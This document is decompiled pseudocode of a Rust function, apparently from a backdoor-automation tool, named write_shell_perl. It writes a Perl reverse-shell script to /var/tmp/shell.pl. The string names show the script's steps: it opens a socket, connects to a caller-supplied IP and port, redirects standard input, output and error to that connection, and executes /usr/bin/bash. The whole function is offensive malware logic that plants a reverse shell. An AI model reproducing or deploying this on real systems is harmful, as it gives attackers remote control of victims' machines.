__int64 __fastcall backdoorautomater::newservice::write_shell_perl(__int64 a1, __int64 a2)
{
  __int64 v2; // r15
  __int128 v3; // xmm0
  __int128 v4; // xmm0
  unsigned int v6; // [rsp+Ch] [rbp-8Ch] BYREF
  const char *v7; // [rsp+10h] [rbp-88h] BYREF
  __int64 v8; // [rsp+18h] [rbp-80h]
  __int128 v9; // [rsp+20h] [rbp-78h]
  __int128 v10; // [rsp+30h] [rbp-68h] BYREF
  __int64 v11; // [rsp+40h] [rbp-58h]
  __int128 v12; // [rsp+50h] [rbp-48h] BYREF
  __int64 v13; // [rsp+60h] [rbp-38h]
  __int128 v14; // [rsp+68h] [rbp-30h] BYREF
  __int64 v15; // [rsp+78h] [rbp-20h]

  std::fs::File::create(&v7, aVarTmpShellPl_0, 18LL);
  if ( (_DWORD)v7 )
  {
    v2 = v8;
  }
  else
  {
    v6 = HIDWORD(v7);
    v2 = std::io::Write::write_all(&v6, aUseSocket_0, 12LL);
    if ( !v2 )
    {
      v3 = *(_OWORD *)(a2 + 8);
      v7 = aI_1;
      v8 = 4LL;
      v9 = v3;
      alloc::str::join_generic_copy(&v14, &v7, 2LL, 1LL, 0LL);
      v11 = v15;
      v10 = v14;
      alloc::vec::Vec<T,A>::extend_from_slice(&v10, asc_1665A1, 3LL);
      v2 = std::io::Write::write_all(&v6, *((_QWORD *)&v10 + 1), v11);
      if ( !v2 )
      {
        v4 = *(_OWORD *)(a1 + 8);
        v7 = aP_2;
        v8 = 3LL;
        v9 = v4;
        alloc::str::join_generic_copy(&v14, &v7, 2LL, 1LL, 0LL);
        v13 = v15;
        v12 = v14;
        alloc::vec::Vec<T,A>::extend_from_slice(&v12, asc_1666A3, 2LL);
        v2 = std::io::Write::write_all(&v6, *((_QWORD *)&v12 + 1), v13);
        if ( !v2 )
        {
          v2 = std::io::Write::write_all(&v6, aSocketSPfInetS_0, 53LL);
          if ( !v2 )
          {
            v2 = std::io::Write::write_all(&v6, aIfConnectSSock_0, 46LL);
            if ( !v2 )
            {
              v2 = std::io::Write::write_all(&v6, aOpenStdinS_0, 19LL);
              if ( !v2 )
              {
                v2 = std::io::Write::write_all(&v6, aOpenStdoutS_0, 20LL);
                if ( !v2 )
                {
                  v2 = std::io::Write::write_all(&v6, aOpenStderrS_0, 20LL);
                  if ( !v2 )
                  {
                    v2 = std::io::Write::write_all(&v6, aExecUsrBinBash_0, 26LL);
                    if ( !v2 )
                    {
                      v2 = std::io::Write::write_all(&v6, asc_16676C, 3LL);
                      if ( !v2 )
                      {
                        core::ptr::drop_in_place<alloc::string::String>(&v12);
                        core::ptr::drop_in_place<alloc::string::String>(&v10);
                        core::ptr::drop_in_place<std::fs::File>(v6);
                        core::ptr::drop_in_place<alloc::string::String>(a2);
                        v2 = 0LL;
                        goto LABEL_17;
                      }
                    }
                  }
                }
              }
            }
          }
        }
        core::ptr::drop_in_place<alloc::string::String>(&v12);
      }
      core::ptr::drop_in_place<alloc::string::String>(&v10);
    }
    core::ptr::drop_in_place<std::fs::File>(v6);
  }
  core::ptr::drop_in_place<alloc::string::String>(a2);
LABEL_17:
  core::ptr::drop_in_place<alloc::string::String>(a1);
  return v2;
}